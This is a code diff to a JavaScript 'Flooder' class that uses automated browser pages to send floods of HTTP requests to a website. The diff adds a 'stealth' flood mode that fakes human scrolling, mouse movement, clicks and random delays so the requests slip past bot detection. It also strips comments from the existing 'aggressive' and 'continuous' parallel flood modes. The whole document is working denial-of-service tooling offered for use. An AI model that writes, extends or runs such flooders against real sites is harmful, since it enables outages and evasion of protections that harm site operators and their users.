@@ -49,7 +49,6 @@ export class Flooder {
       };
     });
 
-    // Option 1: Sequential requests with logging
     if (this.browserConfig.rps <= 20) {
       for (let i = 0; i < this.browserConfig.rps; i++) {
         const method = Math.random() > 0.9 ? "POST" : "GET";
@@ -112,14 +111,11 @@ export class Flooder {
           batchEnd
         );
 
-        // Small delay between batches
         if (batch < batches - 1) {
           await new Promise((r) => setTimeout(r, randnum(200, 500)));
         }
       }
     }
-
-    // Get final statistics
     const stats = await page.evaluate(() => window.__floodStats);
 
     log(
@@ -130,14 +126,144 @@ export class Flooder {
     return { success: true, stats, browserData: this.browserData };
   }
 
-  // Alternative: Ultra-fast parallel flooding (use with caution)
+  async startStealth(page) {
+    log(
+      "FLOODER",
+      `Browser ${this.browserId} starting STEALTH flood with ${this.browserConfig.rps} requests`
+    );
+
+    await page.evaluate(() => {
+      window.__floodStats = { success: 0, failed: 0, total: 0 };
+
+      // Simulate human-like behavior
+      window.__humanLikeRequest = async (index) => {
+        const startTime = performance.now();
+
+        const actions = [
+          async () => {
+            const scrollAmount = Math.random() * 500;
+            window.scrollBy(0, scrollAmount);
+            await new Promise((r) => setTimeout(r, 100 + Math.random() * 200));
+          },
+          async () => {
+            document.dispatchEvent(
+              new MouseEvent("mousemove", {
+                clientX: Math.random() * window.innerWidth,
+                clientY: Math.random() * window.innerHeight,
+              })
+            );
+            await new Promise((r) => setTimeout(r, 50 + Math.random() * 100));
+          },
+          async () => {
+            const x = Math.random() * window.innerWidth;
+            const y = Math.random() * window.innerHeight;
+            document.dispatchEvent(
+              new MouseEvent("click", {
+                clientX: x,
+                clientY: y,
+                bubbles: true,
+              })
+            );
+            await new Promise((r) => setTimeout(r, 100 + Math.random() * 300));
+          },
+        ];
+
+        const numActions = Math.floor(Math.random() * 3);
+        for (let i = 0; i < numActions; i++) {
+          const action = actions[Math.floor(Math.random() * actions.length)];
+          await action();
+        }
+
+        try {
+          const methods = ["GET", "GET", "GET", "GET", "POST"];
+          const method = methods[Math.floor(Math.random() * methods.length)];
+
+          let url = window.location.href;
+          if (Math.random() > 0.7) {
+            const params = new URLSearchParams(window.location.search);
+            params.set("_t", Date.now());
+            url = window.location.pathname + "?" + params.toString();
+          }
+
+          const response = await fetch(url, {
+            method: method,
+            credentials: "include",
+            cache: "default",
+            mode: "same-origin",
+            redirect: "follow",
+            headers: {
+              "X-Requested-With": "XMLHttpRequest",
+            },
+          });
+
+          const duration = Math.round(performance.now() - startTime);
+          window.__floodStats.total++;
+
+          if (response.ok) {
+            window.__floodStats.success++;
+            return { success: true, status: response.status, duration, index };
+          } else {
+            window.__floodStats.failed++;
+            return { success: false, status: response.status, duration, index };
+          }
+        } catch (error) {
+          window.__floodStats.failed++;
+          window.__floodStats.total++;
+          return { success: false, error: error.message, index };
+        }
+      };
+    });
+
+    for (let i = 0; i < this.browserConfig.rps; i++) {
+      const result = await page.evaluate(
+        async (idx) => await window.__humanLikeRequest(idx),
+        i
+      );
+
+      if (result.success) {
+        log(
+          "SUCCESS",
+          `Browser ${this.browserId}: Stealth request ${i + 1}/${
+            this.browserConfig.rps
+          } - ${result.status} (${result.duration}ms)`
+        );
+      } else {
+        log(
+          "WARN",
+          `Browser ${this.browserId}: Stealth request ${i + 1}/${
+            this.browserConfig.rps
+          } - ${result.status || "Failed"}`
+        );
+      }
+
+      if (i < this.browserConfig.rps - 1) {
+        const delay = randnum(1001, 10001);
+        log(
+          "INFO",
+          `Browser ${this.browserId}: Waiting ${Math.round(
+            delay / 1000
+          )}s before next request (mimicking human behavior)`
+        );
+        await new Promise((r) => setTimeout(r, delay));
+      }
+    }
+
+    const stats = await page.evaluate(() => window.__floodStats);
+
+    log(
+      "SUCCESS",
+      `Browser ${this.browserId} stealth flood complete: ${stats.success}/${stats.total} successful, ${stats.failed} failed`
+    );
+
+    return { success: true, stats, browserData: this.browserData };
+  }
+
   async startAggressive(page) {
     log(
       "FLOODER",
       `Browser ${this.browserId} starting AGGRESSIVE flood with ${this.browserConfig.rps} concurrent requests`
     );
 
-    // Inject and execute all requests at once
     const results = await page.evaluate(async (rps) => {
       const requests = [];
       for (let i = 0; i < rps; i++) {
@@ -173,14 +299,12 @@ export class Flooder {
     };
   }
 
-  // Alternative: Keep-alive connection with continuous requests
   async startContinuous(page, durationSeconds = 30) {
     log(
       "FLOODER",
       `Browser ${this.browserId} starting CONTINUOUS flood for ${durationSeconds}s`
     );
 
-    // Start continuous flooding in the page
     await page.evaluate((duration) => {
       window.__stopFlooding = false;
       window.__floodStats = { success: 0, failed: 0, total: 0 };
@@ -206,22 +330,18 @@ export class Flooder {
             window.__floodStats.failed++;
             window.__floodStats.total++;
           }
-
-          // Very small delay to prevent browser lockup
           await new Promise((r) => setTimeout(r, 50));
         }
       };
 
-      // Start flooding
       flood();
     }, durationSeconds);
 
-    // Monitor progress
     const startTime = Date.now();
     const endTime = startTime + durationSeconds * 1000;
 
     while (Date.now() < endTime) {
-      await new Promise((r) => setTimeout(r, 5000)); // Check every 5 seconds
+      await new Promise((r) => setTimeout(r, 5000));
 
       const stats = await page.evaluate(() => window.__floodStats);
       const elapsed = Math.round((Date.now() - startTime) / 1000);
@@ -233,11 +353,10 @@ export class Flooder {
       );
     }
 
-    // Stop flooding and get final stats
     await page.evaluate(() => {
       window.__stopFlooding = true;
     });
-    await new Promise((r) => setTimeout(r, 1000)); // Wait for last requests
+    await new Promise((r) => setTimeout(r, 1000));
 
     const finalStats = await page.evaluate(() => window.__floodStats);
 
